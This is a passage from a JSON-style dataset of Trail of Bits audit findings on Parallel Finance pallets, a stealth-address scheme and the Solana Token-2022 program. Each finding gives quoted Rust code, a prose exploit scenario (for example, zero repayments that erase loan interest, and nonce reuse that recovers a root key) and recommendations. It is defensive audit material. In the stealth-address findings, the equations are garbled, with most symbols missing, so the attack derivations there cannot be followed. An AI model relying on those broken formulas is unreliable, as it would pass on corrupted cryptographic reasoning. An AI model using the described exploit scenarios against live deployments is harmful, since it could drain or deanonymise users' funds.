.checked_div(&snapshot.borrow_index) .and_then(|r| r.checked_mul_int(snapshot.principal)) .ok_or(ArithmeticError::Overflow)?; Ok (recent_borrow_balance) } Figure 2.2: pallets/loans/src/lib.rs:1106-1121 Therefore, if the snapshot borrow index is updated to Self::borrow_index(asset_id) , the resulting recent_borrow_balance in Pallet::current_balance_from_snapshot will always be equal to snapshot.principal . That is, no interest will be applied to the loan. It follows that the accrued interest is lost whenever part of the loan is repaid. In an extreme case, if the repaid amount passed to repay_borrow is 0 , users could reset the borrow index without repaying anything. The same issue is present in the implementations of the liquidated_transfer and borrow extrinsics as well. Exploit Scenario A malicious user borrows assets from Parallel Finance and calls repay_borrow with a repay_amount of zero. This allows her to avoid paying interest on the loan. Recommendations Short term, modify the code so that the accrued interest is added to the snapshot principal when the snapshot is updated. Long term, add unit tests for edge cases (like repaying a zero amount) to increase the chances of discovering unexpected system behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Missing validation in Pallet::force_update_market ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The Pallet::force_update_market method can be used to replace the stored market instance for a given asset. Other methods used to update market parameters perform extensive validation of the market parameters, but force_update_market checks only the rate model. pub fn force_update_market ( origin: OriginFor <T>, asset_id: AssetIdOf <T>, market: Market <BalanceOf<T>>, ) -> DispatchResultWithPostInfo { T::UpdateOrigin::ensure_origin(origin)?; ensure!( market.rate_model.check_model(), Error::<T>::InvalidRateModelParam ); let updated_market = Self ::mutate_market(asset_id, |stored_market| { *stored_market = market; stored_market.clone() })?; Self ::deposit_event(Event::<T>::UpdatedMarket(updated_market)); Ok (().into()) } Figure 3.1: pallets/loans/src/lib.rs:539-556 This means that the caller (who is either the root account or half of the general council) could inadvertently change immutable market parameters like ptoken_id by mistake. Exploit Scenario The root account calls force_update_market to update a set of market parameters. By mistake, the ptoken_id market parameter is updated, which means that Pallet::ptoken_id and Pallet::underlying_id are no longer inverses. Recommendations Short term, consider adding more input validation to the force_update_market extrinsic. In particular, it may make sense to ensure that the ptoken_id market parameter has not changed. Alternatively, add validation to check whether the ptoken_id market parameter is updated and to update the UnderlyingAssetId map to ensure that the value matches the Markets storage map.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Missing validation in multiple StakingLedger methods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The staking ledger is used to keep track of the total amount of staked funds in the system. It is updated in response to cross-consensus messaging (XCM) requests to the parent chain (either Polkadot or Kusama). A number of the StakingLedger methods lack sucient input validation before they update the staking ledgers internal state. Even though the input is validated as part of the original XCM call, there could still be issues due to implementation errors or overlooked corner cases. First, the StakingLedger::rebond method does not use checked arithmetic to update the active balance. The method should also check that the computed unlocking_balance is equal to the input value at the end of the loop to ensure that the system remains consistent. pub fn rebond (& mut self , value: Balance ) { let mut unlocking_balance: Balance = Zero::zero(); while let Some (last) = self .unlocking.last_mut() { if unlocking_balance + last.value <= value { unlocking_balance += last.value; self .active += last.value; self .unlocking.pop(); } else { let diff = value - unlocking_balance; unlocking_balance += diff; self .active += diff; last.value -= diff; } if unlocking_balance >= value { break ; } } } Figure 4.1: pallets/liquid-staking/src/types.rs:199-219 Second, the StakingLedger::bond_extra method does not use checked arithmetic to update the total and active balances . pub fn bond_extra (& mut self , value: Balance ) { self .total += value; self .active += value; } Figure 4.2: pallets/liquid-staking/src/types.rs:223-226 Finally, the StakingLedger::unbond method does not use checked arithmetic when updating the active balance. pub fn unbond (& mut self , value: Balance , target_era: EraIndex ) { if let Some ( mut chunk) = self .unlocking .last_mut() .filter(|chunk| chunk.era == target_era) { // To keep the chunk count down, we only keep one chunk per era. Since // `unlocking` is a FIFO queue, if a chunk exists for `era` we know that // it will be the last one. chunk.value = chunk.value.saturating_add(value); } else { self .unlocking.push(UnlockChunk { value, era: target_era , }); }; // Skipped the minimum balance check because the platform will // bond `MinNominatorBond` to make sure: // 1. No chill call is needed // 2. No minimum balance check self .active -= value; } Figure 4.3: pallets/liquid-staking/src/types.rs:230-253 Since the staking ledger is updated by a number of the XCM response handlers, and XCM responses may return out of order, it is important to ensure that input to the staking ledger methods is validated to prevent issues due to race conditions and corner cases. We could not nd a way to exploit this issue, but we cannot rule out the risk that it could be used to cause a denial-of-service condition in the system. Exploit Scenario The staking ledger's state is updated as part of a WithdrawUnbonded request, leaving the unlocking vector in the staking ledger empty. Later, when the response to a previous call to rebond is handled, the ledger is updated again, which leaves it in an inconsistent state. Recommendations Short term, ensure that the balance represented by the staking ledgers unlocking vector is enough to cover the input balance passed to StakingLedger::rebond . Use checked arithmetic in all staking ledger methods that update the ledgers internal state to ensure that issues due to data races are detected and handled correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Failed XCM requests left in storage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "When the liquid-staking pallet generates an XCM request for the parent chain, the corresponding XCM response triggers a call to Pallet::notification_received . If the response is of the Response::ExecutionResult type, this method calls Pallet::do_notification_received to handle the result. The Pallet::do_notification_received method checks whether the request was successful and then updates the local state according to the corresponding XCM request, which is obtained from the XcmRequests storage map. fn do_notification_received ( query_id: QueryId , request: XcmRequest <T>, res: Option <( u32 , XcmError)>, ) -> DispatchResult { use ArithmeticKind::*; use XcmRequest::*; let executed = res.is_none(); if !executed { return Ok (()); } match request { Bond { index: derivative_index , amount, } => { ensure!( !StakingLedgers::<T>::contains_key(&derivative_index), Error::<T>::AlreadyBonded ); let staking_ledger = <StakingLedger<T::AccountId, BalanceOf<T>>>::new( Self ::derivative_sovereign_account_id(derivative_index), amount, ); StakingLedgers::<T>::insert(derivative_index, staking_ledger); MatchingPool::<T>::try_mutate(|p| -> DispatchResult { p.update_total_stake_amount(amount, Subtraction) })?; T::Assets::burn_from( Self ::staking_currency()?, & Self ::account_id(), Amount )?; } // ... <redacted> } XcmRequests::<T>::remove(&query_id); Ok (()) } Figure 5.1: pallets/liquid-staking/src/lib.rs:1071-1159 If the method completes without errors, the XCM request is removed from storage via a call to XcmRequests<T>::remove(query_id) . However, if any of the following conditions are true, the corresponding XCM request is left in storage indenitely: 1. The request fails and Pallet::do_notification_received exits early. 2. Pallet::do_notification_received fails. 3. The response type is not Response::ExecutionResult . These three cases are currently unhandled by the codebase. The same issue is present in the crowdloans pallet implementation of Pallet::do_notification_received . Recommendations Short term, ensure that failed XCM requests are handled correctly by the crowdloans and liquid-staking pallets.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Risk of using stale oracle prices in loans pallet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The loans pallet uses oracle prices to nd a USD value of assets using the get_price function (gure 6.1). The get_price function internally uses the T::PriceFeeder::get_price function, which returns a timestamp and the price. However, the returned timestamp is ignored. pub fn get_price (asset_id: AssetIdOf <T>) -> Result <Price, DispatchError> { let (price, _) = T::PriceFeeder::get_price(&asset_id) .ok_or(Error::<T>::PriceOracleNotReady)?; if price.is_zero() { return Err (Error::<T>::PriceIsZero.into()); } log::trace!( target: \"loans::get_price\" , \"price: {:?}\" , price.into_inner() ); Ok (price) } Figure 6.1: pallets/loans/src/lib.rs: 1430-1441 Exploit Scenario The price feeding oracles fail to deliver prices for an extended period of time. The get_price function returns stale prices, causing the get_asset_value function to return a non-market asset value. Recommendations Short term, modify the code so that it compares the returned timestamp from the T::PriceFeeder::get_price function with the current timestamp, returns an error if the price is too old, and handles the emergency price, which currently has a timestamp of zero. This will stop the market if stale prices are returned and allow the governance process to intervene with an emergency price.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Missing calculations in crowdloans extrinsics ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The claim extrinsic in the crowdloans pallet is missing code to subtract the claimed amount from vault.contributed to update the total contribution amount (gure 7.1). A similar bug exists in the refund extrinsic: there is no subtraction from vault.contributed after the Self::contribution_kill call. pub fn claim ( origin: OriginFor <T>, crowdloan: ParaId , lease_start: LeasePeriod , lease_end: LeasePeriod , ) -> DispatchResult { // ... <redacted> Self ::contribution_kill( vault.trie_index, &who, ChildStorageKind::Contributed ); Self ::deposit_event(Event::<T>::VaultClaimed( crowdloan, (lease_start, lease_end), ctoken, who, amount, VaultPhase::Succeeded, )); Ok (()) } Figure 7.1: pallets/crowdloans/src/lib.rs: 718- Exploit Scenario The claim extrinsic is called, but the total amount in vault.contributed is not updated, leading to incorrect calculations in other places. Recommendations Short term, update the claim and refund extrinsics so that they subtract the amount from vault.contributed . Long term, add a test suite to ensure that the vault state stays consistent after the claim and refund extrinsics are called.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Event emitted when update_vault and set_vrf calls do not make updates ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The update_vault extrinsic in the crowdloans pallet is responsible for updating the three values shown in gure 8.1. It is possible to call update_vault in such a way that no update is performed, but the function emits an event regardless of whether an update occurred. The same situation occurs in the set_vrfs extrinsic (gure 8.2). pub fn update_vault ( origin: OriginFor <T>, crowdloan: ParaId , cap: Option <BalanceOf<T>>, end_block: Option <BlockNumberFor<T>>, contribution_strategy: Option <ContributionStrategy>, ) -> DispatchResult { T::UpdateVaultOrigin::ensure_origin(origin)?; let mut vault = Self ::current_vault(crowdloan) .ok_or(Error::<T>::VaultDoesNotExist)?; if let Some (cap) = cap { // ... <redacted> } if let Some (end_block) = end_block { // ... <redacted> } if let Some (contribution_strategy) = contribution_strategy { // ... <redacted> } // ... <redacted> Self ::deposit_event(Event::<T>::VaultUpdated( crowdloan, (lease_start, lease_end), contribution_strategy, cap, end_block, )); Ok (()) } Figure 8.1: pallets/crowdloans/src/lib.rs:424-472 pub fn set_vrfs (origin: OriginFor <T>, vrfs: Vec <ParaId>) -> DispatchResult { T::VrfOrigin::ensure_origin(origin)?; log::trace!( target: \"crowdloans::set_vrfs\" , \"pre-toggle. vrfs: {:?}\" , vrfs ); Vrfs::<T>::try_mutate(|b| -> Result <(), DispatchError> { *b = vrfs.try_into().map_err(|_| Error::<T>::MaxVrfsExceeded)?; Ok (()) })?; Self ::deposit_event(Event::<T>::VrfsUpdated( Self ::vrfs())); Ok (()) } Figure 8.2: pallets/crowdloans/src/lib.rs:599-616 Exploit Scenario A system observes that the VaultUpdate event was emitted even though the vault state did not actually change. Based on this observation, it performs logic that should be executed only when the state has been updated. Recommendations Short term, modify the VaultUpdate event so that it is emitted only when the update_vault extrinsic makes an actual update. Optionally, have the update_vault extrinsic return an error to the caller when calling it results in no updates.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. The referral code is a sequence of arbitrary bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The referral code is used in a number of extrinsic calls in the crowdloans pallet. Because the referral code is never validated, it can be a sequence of arbitrary bytes. The referral code is logged by a number of extrinsics. However, it is currently impossible to perform log injection because the referral code is printed as a hexidecimal string rather than raw bytes (using the debug representation). pub fn contribute ( origin: OriginFor <T>, crowdloan: ParaId , #[pallet::compact] amount: BalanceOf <T>, referral_code: Vec < u8 > , ) -> DispatchResultWithPostInfo { // ... <redacted> log::trace!( target: \"crowdloans::contribute\" , \"who: {:?}, para_id: {:?}, amount: {:?}, referral_code: {:?}\" , &who, &crowdloan, &amount, &referral_code ); Ok (().into()) } Figure 9.1: pallets/crowdloans/src/lib.rs: 502-594 Exploit Scenario The referral code is rendered as raw bytes in a vulnerable environment, introducing an opportunity to perform a log injection attack. Recommendations Short term, choose and implement a data type that models the referral code semantics as closely as possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Missing validation of referral code size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "The length of the referral code is not validated by the contribute extrinsic dened by the crowdloans pallet. Since the referral code is stored by the node, a malicious user could call contribute multiple times with a very large referral code. This would increase the memory pressure on the node, potentially leading to memory exhaustion. fn do_contribute ( who: & AccountIdOf <T>, crowdloan: ParaId , vault_id: VaultId , amount: BalanceOf <T>, referral_code: Vec < u8 >, ) -> Result <(), DispatchError> { // ... <redacted> XcmRequests::<T>::insert( query_id, XcmRequest::Contribute { crowdloan, vault_id, who: who .clone(), amount, referral_code: referral_code .clone() , }, ); // ... <redacted> Ok (()) } Figure 10.1: pallets/crowdloans/src/lib.rs: 1429- Exploit Scenario A malicious user calls the contribute extrinsic multiple times with a very large referral code. This increases the memory pressure on the validator nodes and eventually causes all parachain nodes to run out of memory and crash. Recommendations Short term, add validation that limits the size of the referral code argument to the contribute extrinsic.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Code duplication in crowdloans pallet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "description": "A number of extrinsics in the crowdloans pallet have duplicate code. The close , reopen , and auction_succeeded extrinsics have virtually identical logic. The migrate_pending and refund extrinsics are also fairly similar. Exploit Scenario A vulnerability is found in the duplicate code, but it is patched in only one place. Recommendations Short term, refactor the close , reopen , and auction_succeeded extrinsics into one function, to be called with values specic to the extrinsics. Refactor common pieces of logic in the migrate_pending and refund extrinsics. Long term, avoid code duplication, as it makes the system harder to review and update. Perform regular code reviews and track any logic that is duplicated.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Related-nonce attacks across keys allow root key recovery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "description": "Given multiple addresses generated by the same sender, if any two signatures with the associated private keys use the same nonce, then the recipients private root key can be recovered. Nonce reuse attacks are a known risk for single ECDSA keys, but this attack extends the vulnerability to all keys generated by a given sender. Exploit Scenario Alice uses Bobs public key to generate addresses  1 =  (  ||1 ) *  +   and  =  (  ||2 ) *  +  and deposits funds in each. Bobs corresponding private  2 keys will be   1 does not know  ||1 ) +  =  (    2   , she does know the dierence of the two: 2 =  (  ||2 ) +  and    1 or . Note that, while Alice   =  2   1 =  (  ||2 )   (  ||1 )  . As a result, she can write  2 =  1 +  .   Suppose Bob signs messages with hashes (respectively), and he uses the same nonce  2 and to transfer the funds out of   1 2  in both signatures. He will output signatures  1  1 and  1 ) (  ,  1 and ) (  ,  2 , where  = (  *  ) ,   1 =  (  1 ) +   1 , and =   2 (  2 +   1 +   )  .  Subtracting the -values gives us  1 except  are known, Alice can recover  1   2  =  (  1  , and thus 1   2  , and 2    )    . Because all the terms =  2   (  ||2 ) .  Recommendations Consider using deterministic nonce generation in any stealth-enabled wallets. This is an approach used in multiple elliptic curve digital signature schemes, and can be adapted to ECDSA relatively easily; see RFC 6979 . Also consider root key blinding. Set   =  (  ||  ) *  +  (  ||  ||\"  \" ) *    With blinding, private keys take the form   =  (  ||  ) +    (  ||  ||\"  \" )   Since the   terms no longer cancel out, Alice cannot nd , and the attack falls apart.    .  . Finally, consider using homogeneous key derivation. Set private key for Bob is then   =  (  ||  )   +       =  (  ||  ) *  +   . Because Alice does not know   . The  ,  she cannot nd  , and the attack falls apart.  References   ECDSA: Handle with Care RFC 6979: Deterministic Usage of the Digital Signature Algorithm (DSA) and Elliptic Curve Digital Signature Algorithm (ECDSA)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Limited forgeries for related keys ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "description": "If Bob signs a message for an address generated by Alice, Alice can convert it into a valid signature for another address. She cannot, however, control the hash of the message being signed, so this attack is of limited value. As with the related-nonce attack, this attack relies on Alice knowing the dierence in discrete logarithms between two addresses. Exploit Scenario Alice generates addresses  1 =  (  ||1 ) *  +   and  2  =  (  ||2 ) *  +    and deposits funds in each account. As before, Alice knows discrete logs for  1 and  , and 2   =  2   . 1   , the dierence of the Bob transfers money out of  , generating signature 2  *  -coordinate of (where  where  is the  (  ,  ) of a message   with hash , is the nonce). The signature is validated by computing  =    1 *  +    1 *  2 and verifying that the  -coordinate of   matches . Alice can convert this into a signature under for a message with hash  ' =  +   .  Verifying this signature under  , computing 1  1  becomes:  = (  +    1 )  *  +    1 *  1   1 =   *  +    1   1  *  +   1 *    1 =   *  +    1 (  1 +   ) *   1 =   *  +    1 *  2 This is the same relation that makes will be correct. (  ,  ) a valid signature on a message with hash , so   Note that Alice has no control over the value of  ' would have to nd a preimage preimages is, to date, a hard problem for SHA-256 and related functions. under the given hash function. Computing , so to make an eective exploit, she  ' of  ' Recommendations Consider root key blinding, as above. The attack relies on Alice knowing blinding prevents her from learning it.   , and root key Consider homogeneous key derivation, as above. Once again, depriving Alice of   obviates the attack completely.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Mutual transactions can be completely deanonymized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "description": "When Alice and Bob both make stealth payments to each other, they generate the same Shared Secret #i for transaction i, which is used to derive destination keys for Bob and Alice: Symbol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Allowing invalid public keys may enable DH private key recovery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "description": "Consider the following three assumptions: 1. 2. 3. Alice can add points that are not on the elliptic curve to the public key database, Bob does not verify the public key points, and Bob's scalar multiplication implementation has some specic characteristics. Assumptions 1 and 2 are currently not specied in the specication, which motivates this nding. If these assumptions hold, then Alice can recover Bob's DH key using a complicated attack, based on the CRYPTO 2000 paper by Biehl et al. and the DCC 2005 paper by Ciet et al . What follows is a rough sketch of the attack. For more details, see the reference publications, which also detail the specic characteristics for Assumption 3. Exploit Scenario Alice roughly follows the following steps: 1. Find a point  ' which is not on the curve used for ECDH, and a. b. when used in Bobs scalar multiplication, is eectively on a dierent curve  ' 2. 3. 4. with (a subgroup of) small prime order Brute-force all possible values of addresses with shared secret    ' for  (    ' || 0 ) the unique stealth address associated with     ' = (    ' )   ' .   ' . 0   <  ' , i.e.,    ' =   , and sends funds to all +  (    '|| 0 ) *  =   .     ' . This happens because Monitor all resulting addresses associated with until Bob withdraws funds from Repeat steps 13 for new points '   with dierent small prime orders '   to recover  '   .   5. Use the Chinese Remainder Theorem to recover   from   '   .  As a result, Alice can now track all stealth payments made to Bob (but cannot steal funds). To understand the complexity of this attack, it is sucient for Alice to repeat steps 13 for the rst 44 primes (numbers between 2 and 193). This requires Alice to make 3,831 payments in total (corresponding to the sum of the rst 44 primes). There is a tradeo where Alice uses fewer primes, which means that fewer transactions are needed. However, it means that Alice does not recover the full b dh . To compensate for this, Alice can brute-force the discrete logarithm of B dh guided by the partial information on b dh . Because the attack compromises anonymity for a particular user without giving access to funds, we consider this issue to have medium severity. As this is a complicated attack with various assumptions that requires Bob to access the funds from all his stealth addresses, we consider this issue to have high diculty. Recommendations The specication should enforce that public keys are validated for correctness, both when they are added to the public database and when they are used by senders and receivers. These validations should include point-on-curve checks, small-order-subgroup checks (if applicable), and point-at-innity checks. References   Dierential Fault Attacks on Elliptic Curve Cryptosystems, Biehl et al., 2000 Elliptic Curve Cryptosystems in the Presence of Permanent and Transient Faults, Ciet et al.,",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Ok returned for malformed extension data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "In the get_extension_types function, if the account type-length-value (TLV) data is malformed and the TLV record data is truncated (i.e., the account data length is less than the start oset summed with the length of the TLV data), the function returns Ok rather than an error. fn get_extension_types (tlv_data: & [ u8 ]) -> Result < Vec <ExtensionType>, ProgramError> { let mut extension_types = vec! []; let mut start_index = 0 ; while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Ok (extension_types); } Figure 1.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L127-L134 Recommendations Short term, modify the get_extension_types function so that it returns an error if the TLV data is corrupt. This will ensure that the Token Program will not continue processing if the provided accounts extension data is corrupt.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Missing account ownership checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "Every account that the Token Program operates on should be owned by the Token Program, but several instructions lack account ownership checks. The functions lacking checks include process_reallocate , process_withdraw_withheld_tokens_from_mint , and process_withdraw_withheld_tokens_from_accounts . Many of these functions have an implicit check for this condition in that they modify the account data, which is possible only if the account is owned by the Token Program; however, future changes to the associated code could remove this protection. For example, in the process_withdraw_withheld_tokens_from_accounts instruction, neither the mint_account_info nor destination_account_info parameter is checked to ensure the account is owned by the Token Program. While the mint accounts data is mutably borrowed, the account data is never written. As a result, an attacker could pass a forged account in place of the mint account. Conversely, the destination_account_info accounts data is updated by the instruction, so it must be owned by the Token Program. However, if an attacker can nd a way to spoof an account public key that matches the mint property in the destination account, he could bypass the implicit check. Recommendations Short term, as a defense-in-depth measure, add explicit checks of account ownership for all accounts passed to instructions. This will both improve the clarity of the codebase and remove the dependence on implicit checks, which may no longer hold true when updates occur.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Use of a vulnerable dependency ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "Running the cargo audit command uncovered the use of one crate with a known vulnerability ( time ).  cargo audit Fetching advisory database from `https://github.com/RustSec/advisory-db.git` Loaded 458 security advisories (from /Users/andershelsing/.cargo/advisory-db) Updating crates.io index Scanning Cargo.lock for vulnerabilities (651 crate dependencies) Crate: time Version: 0.1.44 Title: Potential segfault in the time crate Date: 2020-11-18 ID: RUSTSEC-2020-0071 URL: https://rustsec.org/advisories/RUSTSEC-2020-0071 Solution: Upgrade to >=0.2.23 Figure 3.1: The result of running the cargo audit command Recommendations Short term, triage the use of the vulnerability in the time crate and upgrade the crate to a version in which the vulnerability is patched.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Large extension sizes can cause panics ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The call to try_from in the init_extension function returns an error if the length of the given extension is larger than u16::Max , which causes the unwrap operation to panic. let length = pod_get_packed_len::<V>(); *length_ref = Length::try_from(length).unwrap(); Figure 4.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L493-L494 Recommendations Short term, add assertions to the program to catch extensions whose sizes are too large, and add relevant code to handle errors that could arise in the try_from function. This will ensure that the Token Program does not panic if any extension grows larger than u16::Max .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Unexpected function behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The decode_instruction_data function receives a byte slice representing the instruction data. Specically, the function expects the rst byte of the slice to contain the instruction type for an extension instruction; however, the function name does not clearly convey this intended behavior, and the behavior is not explained in code comments. /// Utility function for decoding instruction data pub fn decode_instruction_data <T: Pod >(input: & [ u8 ]) -> Result <&T, ProgramError> { if input.len() != pod_get_packed_len::<T>().saturating_add( 1 ) { Err (ProgramError::InvalidInstructionData) } else { pod_from_bytes( &input[ 1 ..] ) } } Figure 5.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/instruction.rs#L1761-L1768 Recommendations Short term, change the decode_instruction_data function so that it operates only on instruction data, and remove the instruction type from the data passed prior to the call. This will ensure that the functions name is in line with the functions operation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Out of bounds access in the get_extension instruction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The get_extension function instantiates a type from a TLV record. However, the get_extension_indices function does not check that the accounts data length is large enough for the value_end index. fn get_extension <S: BaseState , V: Extension >(tlv_data: &[u8]) -> Result <&V, ProgramError> { if V::TYPE.get_account_type() != S::ACCOUNT_TYPE { return Err (ProgramError::InvalidAccountData); } let TlvIndices { type_start: _ , length_start, value_start, } = get_extension_indices::<V>(tlv_data, false )?; // get_extension_indices has checked that tlv_data is long enough to include these indices let length = pod_from_bytes::<Length>(&tlv_data[length_start..value_start])?; let value_end = value_start.saturating_add(usize::from(*length)); pod_from_bytes::<V>(&tlv_data[ value_start..value_end ]) } Figure 6.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L235-L248 Recommendations Short term, add a check to ensure that the TLV data for the account is large enough for the value_end index, and add relevant code to handle the error if it is not. This will ensure that the Token Program will not panic on accounts with truncated data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Iteration over empty data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "The get_extension_indices function returns either the indices for a given extension type or the rst uninitialized slot. Because a TLV data record can never be deleted, the rst zero-value entry of the slice should indicate that the iteration has reached the end of the used data space. However, if the init parameter is false, the start_index index is advanced by two, and the iteration continues, presumably iterating over empty data until it reaches the end of the TLV data for the account. while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Err (ProgramError::InvalidAccountData); } ... // got to an empty spot, can init here, or move forward if not initing if extension_type == ExtensionType::Uninitialized { if init { return Ok (tlv_indices); } else { start_index = tlv_indices.length_start; } } ... Figure 7.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L96-L122 Recommendations Short term, modify the associated code so that it terminates the iteration when it reaches uninitialized data, which should indicate the end of the used TLV record data.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Missing check in UpdateMint instruction could result in inoperable mints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "description": "If a mints auto_approve_new_accounts property is false , the ApproveAccount instruction needs the mints authority to sign transactions approving Accounts for the mint. However, issuing an update_mint instruction with the new authority set to Pubkey::default and the auto_approve_new_accounts property set to false would prevent Accounts from being approved. /// Processes an [UpdateMint] instruction. fn process_update_mint ( accounts: & [AccountInfo], new_confidential_transfer_mint: & ConfidentialTransferMint , ) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; let new_authority_info = next_account_info(account_info_iter)?; check_program_account(mint_info.owner)?; let mint_data = & mut mint_info.data.borrow_mut(); let mut mint = StateWithExtensionsMut::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension_mut::<ConfidentialTransferMint>()?; if authority_info.is_signer && confidential_transfer_mint.authority == *authority_info.key && (new_authority_info.is_signer || *new_authority_info.key == Pubkey::default() ) && new_confidential_transfer_mint.authority == *new_authority_info.key { *confidential_transfer_mint = *new_confidential_transfer_mint; Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L64-L89 /// Processes an [ApproveAccount] instruction. fn process_approve_account (accounts: & [AccountInfo]) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let token_account_info = next_account_info(account_info_iter)?; let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; check_program_account(token_account_info.owner)?; let token_account_data = & mut token_account_info.data.borrow_mut(); let mut token_account = StateWithExtensionsMut::<Account>::unpack(token_account_data)?; check_program_account(mint_info.owner)?; let mint_data = &mint_info.data.borrow_mut(); let mint = StateWithExtensions::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension::<ConfidentialTransferMint>()?; if authority_info.is_signer && *authority_info.key == confidential_transfer_mint.authority { let mut confidential_transfer_state = token_account.get_extension_mut::<ConfidentialTransferAccount>()?; confidential_transfer_state.approved = true .into(); Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.2: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L180-L204 Recommendations Short term, add a check to ensure that the auto_approve_new_accounts property is not false when the new authority is Pubkey::default . This will ensure that contract users cannot accidentally disable the authorization of accounts for mints.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Incorrect test data description ",
